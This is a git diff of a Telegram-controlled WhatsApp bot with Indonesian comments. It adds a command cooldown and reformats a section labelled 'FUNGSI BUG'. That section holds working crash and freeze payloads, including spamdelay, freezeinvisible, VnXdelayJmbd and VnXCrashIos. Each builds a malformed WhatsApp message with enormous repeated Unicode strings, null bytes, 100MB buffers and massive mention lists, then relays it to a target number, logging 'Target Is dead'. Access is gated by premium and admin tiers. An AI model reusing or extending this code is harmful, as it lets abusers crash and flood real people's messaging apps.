@@ -20,6 +20,7 @@ const sessionPath = "./session";
 const premiumFile = "./Stored/premiums.json";
 const adminFile = "./Stored/admins.json";
 const ownerFile = "./Stored/owners.json";
+const cooldownFile = "./Stored/cooldown.json";
 
 // ======================= VARIABEL GLOBAL =======================
 let sock = null;
@@ -30,6 +31,7 @@ let reconnectAttempts = 0;
 const maxReconnect = 10;
 let currentVersion = "1.0.0";
 let pendingUpdate = false;
+let cooldownSettings = {};
 
 // Cache Token GitHub
 let cachedValidTokens = [];
@@ -56,6 +58,17 @@ const loadJSON = (filePath) => {
     }
 };
 
+const loadObjectJSON = (filePath) => {
+    try {
+        if (!fs.existsSync(filePath)) return {};
+        const data = fs.readFileSync(filePath, "utf8");
+        return data ? JSON.parse(data) : {};
+    } catch (err) {
+        console.error(chalk.red(`Gagal memuat ${filePath}:`), err.message);
+        return {};
+    }
+};
+
 const saveJSON = (filePath, data) => {
     try {
         fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
@@ -67,6 +80,35 @@ const saveJSON = (filePath, data) => {
 let adminUsers = loadJSON(adminFile);
 let premiumUsers = loadJSON(premiumFile);
 let ownerUsers = loadJSON(ownerFile);
+cooldownSettings = loadObjectJSON(cooldownFile);
+
+// ======================= FUNGSI COOLDOWN =======================
+const setCooldown = (command, duration) => {
+    cooldownSettings[command] = duration;
+    saveJSON(cooldownFile, cooldownSettings);
+};
+
+const getCooldown = (command) => {
+    return cooldownSettings[command] || null;
+};
+
+const checkCooldown = (ctx, command) => {
+    const cooldown = getCooldown(command);
+    if (!cooldown) return true;
+    
+    const lastUsed = ctx.session?.lastCommand?.[command] || 0;
+    const now = Date.now();
+    const diff = (now - lastUsed) / 1000;
+    
+    if (diff < cooldown) {
+        ctx.reply(`Tunggu ${Math.ceil(cooldown - diff)} detik sebelum menggunakan /${command} lagi.`);
+        return false;
+    }
+    
+    if (!ctx.session.lastCommand) ctx.session.lastCommand = {};
+    ctx.session.lastCommand[command] = now;
+    return true;
+};
 
 // ======================= FUNGSI TOKEN GITHUB =======================
 async function fetchValidTokens(forceRefresh = false) {
@@ -76,7 +118,7 @@ async function fetchValidTokens(forceRefresh = false) {
     }
 
     try {
-        console.log(chalk.yellow("🔄 Mengambil token dari GitHub..."));
+        console.log(chalk.yellow("Mengambil token dari GitHub..."));
         const GITHUB_URL = "https://raw.githubusercontent.com/sihalohoalexander389-oss/database-/main/database.json";
         const { data } = await axios.get(GITHUB_URL, {
             timeout: 10000,
@@ -84,36 +126,24 @@ async function fetchValidTokens(forceRefresh = false) {
         });
         cachedValidTokens = Array.isArray(data.tokens) ? data.tokens : [];
         lastTokenFetch = now;
-        console.log(chalk.green(`✅ ${cachedValidTokens.length} token ditemukan`));
+        console.log(chalk.green(`${cachedValidTokens.length} token ditemukan`));
         return cachedValidTokens;
     } catch (err) {
-        console.log(chalk.red("❌ Gagal ambil token:", err.message));
+        console.log(chalk.red("Gagal ambil token:", err.message));
         return cachedValidTokens.length ? cachedValidTokens : [];
-    }
-}
-
-// ======================= FUNGSI CEK VERSI SCRIPT =======================
-async function checkScriptVersion() {
-    try {
-        const VERSION_URL = "https://raw.githubusercontent.com/sihalohoalexander389-oss/database-/main/version.json";
-        const { data } = await axios.get(VERSION_URL, { timeout: 10000 });
-        return data.version || "1.0.0";
-    } catch (err) {
-        console.log(chalk.red("Gagal cek versi:", err.message));
-        return currentVersion;
     }
 }
 
 // ======================= VALIDASI TOKEN AWAL =======================
 async function validateTokenOnStart() {
-    console.log(chalk.blue("🔍 Verifikasi token ke GitHub..."));
+    console.log(chalk.blue("Verifikasi token ke GitHub..."));
     const validTokens = await fetchValidTokens(true);
 
     if (!validTokens.length) {
         console.log(chalk.red(`
 ╔══════════════════════════════════════╗
-║  ❌ TIDAK ADA TOKEN DI DATABASE      ║
-║  ☇ Tambahkan token via Web           ║
+║  TIDAK ADA TOKEN DI DATABASE         ║
+║  Tambahkan token via Web             ║
 ╚══════════════════════════════════════╝
         `));
         process.exit(1);
@@ -122,14 +152,14 @@ async function validateTokenOnStart() {
     if (!validTokens.includes(BOT_TOKEN)) {
         console.log(chalk.red(`
 ╔══════════════════════════════════════╗
-║  ❌ TOKEN TELEGRAM TIDAK VALID       ║
-║  ☇ Hubungi owner untuk menambahkan   ║
+║  TOKEN TELEGRAM TIDAK VALID          ║
+║  Hubungi owner untuk menambahkan     ║
 ╚══════════════════════════════════════╝
         `));
         process.exit(1);
     }
 
-    console.log(chalk.green("✅ Token valid! Bot akan berjalan..."));
+    console.log(chalk.green("Token valid! Bot akan berjalan..."));
     return true;
 }
 
@@ -138,7 +168,7 @@ function startAutoTokenRefresh() {
     setInterval(async () => {
         const newTokens = await fetchValidTokens(true);
         if (!newTokens.includes(BOT_TOKEN)) {
-            console.log(chalk.red("⚠️ Token Anda telah dihapus dari GitHub! Bot akan mati..."));
+            console.log(chalk.red("Token Anda telah dihapus dari GitHub! Bot akan mati..."));
             setTimeout(() => process.exit(1), 5000);
         }
     }, 60000);
@@ -149,7 +179,7 @@ function deleteSession() {
     try {
         if (fs.existsSync(sessionPath)) {
             fs.rmSync(sessionPath, { recursive: true, force: true });
-            console.log(chalk.yellow("🗑️ Session dihapus"));
+            console.log(chalk.yellow("Session dihapus"));
             return true;
         }
     } catch (err) {
@@ -198,8 +228,8 @@ const startSesi = async () => {
             linkedWhatsAppNumber = sock.user?.id?.split(":")[0];
 
             console.log(chalk.green(`╔════════════════════════════╗`));
-            console.log(chalk.green(`║   ✅ WhatsApp Terhubung    ║`));
-            console.log(chalk.green(`║   📱 ${linkedWhatsAppNumber}   ║`));
+            console.log(chalk.green(`║   WhatsApp Terhubung       ║`));
+            console.log(chalk.green(`║   ${linkedWhatsAppNumber}   ║`));
             console.log(chalk.green(`╚════════════════════════════╝`));
 
             if (global.pairingMessage?.chatId && global.pairingMessage?.messageId) {
@@ -208,7 +238,7 @@ const startSesi = async () => {
                         global.pairingMessage.chatId,
                         global.pairingMessage.messageId,
                         undefined,
-                        `<b>✅ WhatsApp Terhubung</b>\n📱 Nomor: ${linkedWhatsAppNumber}`,
+                        `<b>WhatsApp Terhubung</b>\nNomor: ${linkedWhatsAppNumber}`,
                         { parse_mode: "HTML" }
                     );
                 } catch (e) {}
@@ -230,7 +260,7 @@ const startSesi = async () => {
             if (reconnectAttempts > maxReconnect) return;
 
             const delay = Math.min(5000 * reconnectAttempts, 30000);
-            console.log(chalk.yellow(`♻️ Reconnect dalam ${delay / 1000}s`));
+            console.log(chalk.yellow(`Reconnect dalam ${delay / 1000}s`));
             setTimeout(() => startSesi(), delay);
         }
     });
@@ -239,28 +269,28 @@ const startSesi = async () => {
 // ======================= MIDDLEWARE =======================
 const checkOwner = (ctx, next) => {
     if (!OWNER_IDS.includes(ctx.from.id.toString())) {
-        return ctx.reply("❗Mohon Maaf Fitur Ini Khusus Owner");
+        return ctx.reply("Fitur Ini Khusus Owner");
     }
     return next();
 };
 
 const checkAdmin = (ctx, next) => {
     if (!adminUsers.includes(ctx.from.id.toString())) {
-        return ctx.reply("❗ Mohon Maaf Fitur Ini Khusus Admin.");
+        return ctx.reply("Fitur Ini Khusus Admin.");
     }
     return next();
 };
 
 const checkPremium = (ctx, next) => {
     if (!premiumUsers.includes(ctx.from.id.toString())) {
-        return ctx.reply("❗ Mohon Maaf Fitur Ini Khusus Premium.");
+        return ctx.reply("Fitur Ini Khusus Premium.");
     }
     return next();
 };
 
 const checkWA = (ctx, next) => {
     if (!isWhatsAppConnected) {
-        return ctx.reply("❌ WhatsApp Belum terhubung\nGunakan /Addsender untuk pairing terlebih dahulu");
+        return ctx.reply("WhatsApp Belum terhubung\nGunakan /addbot untuk pairing terlebih dahulu");
     }
     return next();
 };
@@ -273,333 +303,228 @@ const removeAdmin = (id) => { adminUsers = adminUsers.filter(i => i !== id); sav
 const addPremium = (id) => { if (!premiumUsers.includes(id)) { premiumUsers.push(id); saveJSON(premiumFile, premiumUsers); } };
 const removePremium = (id) => { premiumUsers = premiumUsers.filter(i => i !== id); saveJSON(premiumFile, premiumUsers); };
 
-// ======================= FUNGSI BUG (PARAMETER TARGET) =======================
-async function freezeinvisible(sock, target) {
-  const msg = {
-    message: {
-      groupStatusMessageV2: {
-        message: {
-          liveLocationMessage: {
-            degreesLatitude: 999999999999999,
-            degreesLongitude: 999999999999999,
-            name: "ោ៝".repeat(40000),
-            address: "ោ៝".repeat(945900),
-            url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA",
-            jpegThumbnail: Buffer.alloc(104857600, 0xFF),
-            contextInfo: {
-              mentionedJid: [target],
-              stanzaId: "maklo",
-              participant: target,
-              urlTrackingMap: {
-                urlTrackingMapElements: Array.from({ length: 209000 }, (_, z) => ({
-                  participant: `62${z + 720599}@s.whatsapp.net`
-                }))
-              }
-            }
-          }
+// ======================= FUNGSI BUG =======================
+async function spamdelay(sock, target) {
+    for (let i = 0; i < 999; i++) {
+        const x = "\u0000".repeat(9000);
+        const ryy = "999999999999";
+        const startTime = Date.now();
+        const duration = 1 * 60 * 1000;
+        while (Date.now() - startTime < duration) {
+            const xryy = {
+                groupStatusMessageV2: {
+                    message: {
+                        stickerPackMessage: {
+                            stickerPackId: x,
+                            name: x,
+                            publisher: x,
+                            fileLength: ryy,
+                            fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
+                            fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
+                            mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
+                            mimetype: "image/webp",
+                            directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
+                            contextInfo: {
+                                remoteJid: Math.random().toString(36) + "\u0000".repeat(90000),
+                                isForwarded: true,
+                                forwardingScore: 9999,
+                                urlTrackingMap: {
+                                    urlTrackingMapElements: Array.from({ length: 209000 }, (_, z) => ({
+                                        participant: `62${z + 899099}@s.whatsapp.net`
+                                    }))
+                                }
+                            }
+                        }
+                    }
+                }
+            };
+            
+            const xryyv2 = {
+                groupStatusMessageV2: {
+                    message: {
+                        interactiveResponseMessage: {
+                            body: {
+                                text: "XRyyModeLawkaNnjr",
+                                format: "DEFAULT"
+                            },
+                            nativeFlowResponseMessage: {
+                                name: "galaxy_message",
+                                paramsJson: "1",
+                                version: 3
+                            },
+                            contextInfo: {
+                                remoteJid: Math.random().toString(36) + "\u0000".repeat(90000),
+                                isForwarded: true,
+                                forwardingScore: 9999,
+                                urlTrackingMap: {
+                                    urlTrackingMapElements: Array.from({ length: 209000 }, (_, z) => ({
+                                        participant: `62${z + 720599}@s.whatsapp.net`
+                                    }))
+                                }
+                            }
+                        }
+                    }
+                }
+            };
+            
+            await sleep(3000);
+            await sock.relayMessage(target, xryy, { participant: { jid: target } });
+            await sock.relayMessage(target, xryyv2, { participant: { jid: target } });
         }
-      }
     }
-  };
-
-  await sock.relayMessage("status@broadcast", msg, {
-    messageId: null,
-    participant: { jid: target },
-    statusJidList: [target],
-    additionalNodes: [{
-      tag: "meta",
-      attrs: {},
-      content: [{
-        tag: "mentioned_users",
-        attrs: {},
-        content: [{
-          tag: "to",
-          attrs: { jid: target },
-          content: undefined
-        }]
-      }]
-    }]
-  });
 }
 
-async function spamdelay(sock, target) {
-  for (let i = 0; i < 999; i++) {
-    const x = "\u0000".repeat(9000);
-    const ryy = "999999999999";
-    const startTime = Date.now();
-    const duration = 1 * 60 * 1000;
-    while (Date.now() - startTime < duration) {
-      const xryy = {
-        groupStatusMessageV2: {
-          message: {
-            stickerPackMessage: {
-              stickerPackId: x,
-              name: x,
-              publisher: x,
-              fileLength: ryy,
-              fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
-              fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
-              mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
-              mimetype: "image/webp",
-              directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
-              contextInfo: {
-                remoteJid: Math.random().toString(36) + "\u0000".repeat(90000),
-                isForwarded: true,
-                forwardingScore: 9999,
-                urlTrackingMap: {
-                  urlTrackingMapElements: Array.from({ length: 209000 }, (_, z) => ({
-                    participant: `62${z + 899099}@s.whatsapp.net`
-                  }))
+async function freezeinvisible(sock, target) {
+    const msg = {
+        message: {
+            groupStatusMessageV2: {
+                message: {
+                    liveLocationMessage: {
+                        degreesLatitude: 999999999999999,
+                        degreesLongitude: 999999999999999,
+                        name: "ោ៝".repeat(40000),
+                        address: "ោ៝".repeat(945900),
+                        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA",
+                        jpegThumbnail: Buffer.alloc(104857600, 0xFF),
+                        contextInfo: {
+                            mentionedJid: [target],
+                            stanzaId: "maklo",
+                            participant: target,
+                            urlTrackingMap: {
+                                urlTrackingMapElements: Array.from({ length: 209000 }, (_, z) => ({
+                                    participant: `62${z + 720599}@s.whatsapp.net`
+                                }))
+                            }
+                        }
+                    }
                 }
-              }
             }
-          }
         }
-      };
-      
-      const xryyv2 = {
-        groupStatusMessageV2: {
-          message: {
-            interactiveResponseMessage: {
-              body: {
-                text: "XRyyModeLawkaNnjr",
-                format: "DEFAULT"
-              },
-              nativeFlowResponseMessage: {
-                name: "galaxy_message",
-                paramsJson: "1",
-                version: 3
-              },
-              contextInfo: {
-                remoteJid: Math.random().toString(36) + "\u0000".repeat(90000),
-                isForwarded: true,
-                forwardingScore: 9999,
-                urlTrackingMap: {
-                  urlTrackingMapElements: Array.from({ length: 209000 }, (_, z) => ({
-                    participant: `62${z + 720599}@s.whatsapp.net`
-                  }))
-                }
-              }
-            }
-          }
-        }
-      };
-      
-      await sleep(3000);
-      await sock.relayMessage(target, xryy, {
-        participant: { jid: target }
-      });
-      await sock.relayMessage(target, xryyv2, {
-        participant: { jid: target }
-      });
-    }
-  }
+    };
+    await sock.relayMessage("status@broadcast", msg, {
+        messageId: null,
+        participant: { jid: target },
+        statusJidList: [target],
+        additionalNodes: [{
+            tag: "meta",
+            attrs: {},
+            content: [{
+                tag: "mentioned_users",
+                attrs: {},
+                content: [{
+                    tag: "to",
+                    attrs: { jid: target },
+                    content: undefined
+                }]
+            }]
+        }]
+    });
 }
 
 async function VnXdelayJmbd(sock, target) {
-  try {
-    const msg = {
-      groupStatusMessageV2: {
-        message: {
-          stickerMessage: {
-            url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
-            fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
-            fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
-            mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
-            mimetype: "image/webp",
-            directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
-            fileLength: 10610,
-            mediaKeyTimestamp: 1775044724,
-            stickerSentTs: 1775044724091,
-            contextInfo: {
-              isForwarded: true,
-              forwardingScore: 9999999,
-              pairedMediaType: 1,
-              statusSourceType: 1,
-              statusAttributionType: 2,
-              urlTrackingMap: {
-                urlTrackingMapElements: Array.from({ length: 250000 }, () => ({}))
-              }
+    try {
+        const msg = {
+            groupStatusMessageV2: {
+                message: {
+                    stickerMessage: {
+                        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
+                        fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
+                        fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
+                        mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
+                        mimetype: "image/webp",
+                        directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
+                        fileLength: 10610,
+                        mediaKeyTimestamp: 1775044724,
+                        stickerSentTs: 1775044724091,
+                        contextInfo: {
+                            isForwarded: true,
+                            forwardingScore: 9999999,
+                            pairedMediaType: 1,
+                            statusSourceType: 1,
+                            statusAttributionType: 2,
+                            urlTrackingMap: {
+                                urlTrackingMapElements: Array.from({ length: 250000 }, () => ({}))
+                            }
+                        }
+                    }
+                }
             }
-          }
-        }
-      }
-    };
-    await sock.relayMessage(target, msg, {
-      participant: { jid: target }
-    });
-    console.log("Target Is dead");
-    await new Promise(r => setTimeout(r, 1500));
-  } catch (err) {
-    console.error("Error:", err);
-    await new Promise(r => setTimeout(r, 5000));
-  }
+        };
+        await sock.relayMessage(target, msg, { participant: { jid: target } });
+        console.log("Target Is dead");
+        await new Promise(r => setTimeout(r, 1500));
+    } catch (err) {
+        console.error("Error:", err);
+        await new Promise(r => setTimeout(r, 5000));
+    }
 }
 
 async function VnXCrashIos(sock, target) {
-  let mbgiosvnx = await generateWAMessageFromContent(
-    target,
-    {
-      contactMessage: {
-        displayName: "°‌‌VnXIos ⿻ VnX ✶ > 666" + "𑇂𑆵𑆴𑆿".repeat(25000),
-        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;🦠⃰‌°‌‌VnX ⿻ Are You Okay? ✶ > 666${"𑇂𑆵𑆴𑆿".repeat(10000)};;;\nFN:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"𑇂𑆵𑆴𑆿".repeat(10000)}\nNICKNAME:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nORG:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nTITLE:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem1.TEL;waid=6287873499996:+62 813-1919-9692\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nEND:VCARD`,
-        contextInfo: {
-          stanzaId: "VnX",
-          mentionedJid: [target],
-          isForwarded: true,
-          forwardingScore: 999,
-          interactiveAnnotations: [{
-            polygonVertices: [
-              { x: 0.05625700578093529, y: 0.1530572921037674 },
-              { x: 0.9437337517738342, y: 0.1530572921037674 },
-              { x: 0.9437337517738342, y: 0.8459166884422302 },
-              { x: 0.05625700578093529, y: 0.8459166884422302 }
-            ],
-            newsletter: {
-              newsletterJid: "120363186130999681@newsletter",
-              serverMessageId: 3033,
-              newsletterName: "sex null",
-              contentType: "UPDATE_CARD"
-            }
-          }]
-        }
-      }
-    },
-    { userJid: sock.user.id, quoted: null }
-  );
-  await sock.relayMessage(
-    "status@broadcast",
-    mbgiosvnx.message,
-    {
-      messageId: mbgiosvnx.key.id,
-      statusJidList: [target],
-      additionalNodes: [
+    let mbgiosvnx = await generateWAMessageFromContent(
+        target,
         {
-          tag: "meta",
-          attrs: {},
-          content: [
-            {
-              tag: "mentioned_users",
-              attrs: {},
-              content: [
-                {
-                  tag: "to",
-                  attrs: { jid: target },
-                  content: undefined
+            contactMessage: {
+                displayName: "°‌‌VnXIos ⿻ VnX ✶ > 666" + "𑇂𑆵𑆴𑆿".repeat(25000),
+                vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;🦠⃰‌°‌‌VnX ⿻ Are You Okay? ✶ > 666${"𑇂𑆵𑆴𑆿".repeat(10000)};;;\nFN:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"𑇂𑆵𑆴𑆿".repeat(10000)}\nNICKNAME:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nORG:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nTITLE:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem1.TEL;waid=6287873499996:+62 813-1919-9692\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nEND:VCARD`,
+                contextInfo: {
+                    stanzaId: "VnX",
+                    mentionedJid: [target],
+                    isForwarded: true,
+                    forwardingScore: 999,
+                    interactiveAnnotations: [{
+                        polygonVertices: [
+                            { x: 0.05625700578093529, y: 0.1530572921037674 },
+                            { x: 0.9437337517738342, y: 0.1530572921037674 },
+                            { x: 0.9437337517738342, y: 0.8459166884422302 },
+                            { x: 0.05625700578093529, y: 0.8459166884422302 }
+                        ],
+                        newsletter: {
+                            newsletterJid: "120363186130999681@newsletter",
+                            serverMessageId: 3033,
+                            newsletterName: "sex null",
+                            contentType: "UPDATE_CARD"
+                        }
+                    }]
                 }
-              ]
             }
-          ]
+        },
+        { userJid: sock.user.id, quoted: null }
+    );
+    await sock.relayMessage(
+        "status@broadcast",
+        mbgiosvnx.message,
+        {
+            messageId: mbgiosvnx.key.id,
+            statusJidList: [target],
+            additionalNodes: [
+                {
+                    tag: "meta",
+                    attrs: {},
+                    content: [
+                        {
+                            tag: "mentioned_users",
+                            attrs: {},
+                            content: [
+                                {
+                                    tag: "to",
+                                    attrs: { jid: target },
+                                    content: undefined
+                                }
+                            ]
+                        }
+                    ]
+                }
+            ]
         }
-      ]
+    );
+}
+
+async function hapusBug(sock, target) {
+    for (let i = 0; i < 3; i++) {
+        await sock.sendMessage(target, { 
+            text: "CIKIDAW CLEAR BUG\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nSENZY GANTENG"
+        });
     }
-  );
-}
-
-async function VnXUi(sock, target) {
-sock.relayMessage(
-target,
-{
-  extendedTextMessage: {
-    text: "ꦾ".repeat(20000) + "@1".repeat(20000),
-    contextInfo: {
-      stanzaId: target,
-      participant: target,
-      quotedMessage: {
-        converation: { paramsJson: "{{".repeat(330000) },
-      },
-      disappearingMode: {
-        initiator: "CHANGED_IN_CHAT",
-        trigger: "CHAT_SETTING",
-      },
-    },
-    inviteLinkGroupTypeV2: "https://wa.me/settings/linked_devices/,,VnXRaffi",
-  },
-},
-{
- paymentInviteMessage: {
-      currencyCodeIso4217: "USD",
-      amount1000: "999999999",
-      expiryTimestamp: "9999999999",
-      inviteMessage: "Payment Invite" + "\u0003".repeat(1770),
-      serviceType: 1,
-  },
-},
-{
-  participant: {
-    jid: target,
-  },
-},
-{
-  messageId: null,
-}
-);
-}
-
-async function VnXDeck(sock, target) {
-sock.relayMessage(
-target,
-{
-  extendedTextMessage: {
-    text: "ꦾ".repeat(20000) + "@1".repeat(2200000),
-    locationMessage: {
-        degreesLatitude: -12999,
-        degreesLongitude: 34999,
-        mame: "VnX⌜𖣂⌟༑⃟",
-        address: "VnX⌜𖣂⌟༑⃟꙳",
-       forwardingScore: 9741,
-         isForwarded: true,
-       forwardedNewsletterMessageInfo: {
-        newsletterJid: "9741@newsletter",
-        serverMessageId: 1,
-        newsletterName: "-"
-       },
-     },
-    inviteLinkGroupTypeV2: "https://wa.me/settings/linked_devices/,,VnXRaffi",
-  },
-},
-{
- paymentLinkMetadata: {
-   button: { displayText: "\u0000" + "{".repeat(12000) },
-   header: { headerType: 1 },
-   provider: { paramsJson: "{{".repeat(220000) },
-   sourceUrl: "https://wa.me/meta",
-  },
-},
-{
-  participant: {
-    jid: target,
-  },
-},
-{
-  messageId: null,
-}
-);
-}
-  
-async function VnXLocaUiNew(sock, target) {
-  await sock.relayMessage(target, {
-    ephemeralMessage: {
-      message: {
-       locationMessage: {
-         degreesLatitude: 11.9987,
-         degreesLongitude: -11.9987,
-         name: " ‼️⃟VnX Ui" + "𑇂𑆵𑆴𑆿".repeat(250000) + "𑇂𑆵𑆴𑆿".repeat(250000),
-         url: "t.me/Raffioffci6",
-       },
-        body: {
-          text: 
-            "𑇂𑆵𑆴𑆿".repeat(250000) +
-            "\u0000".repeat(250000) +
-             "ꦾꦽ".repeat(250000) +
-            `@1`.repeat(99000),
-           },
-           footer: {
-            text: "VnX Ui Is Here" + "𑇂𑆵𑆴𑆿".repeat(250000),
-          }
-        }
-     }
-   }, { participant: { jid: target } });
 }
 
 // ======================= COMMAND TELEGRAM =======================
@@ -619,89 +544,110 @@ const randomImages = [
 ];
 const getRandomImage = () => randomImages[Math.floor(Math.random() * randomImages.length)];
 
-// PAGES MENU DENGAN TAMPILAN BARU DAN PEMBUNGKUS ```JS ```
-const pages = {
-    0: {
-        name: "main",
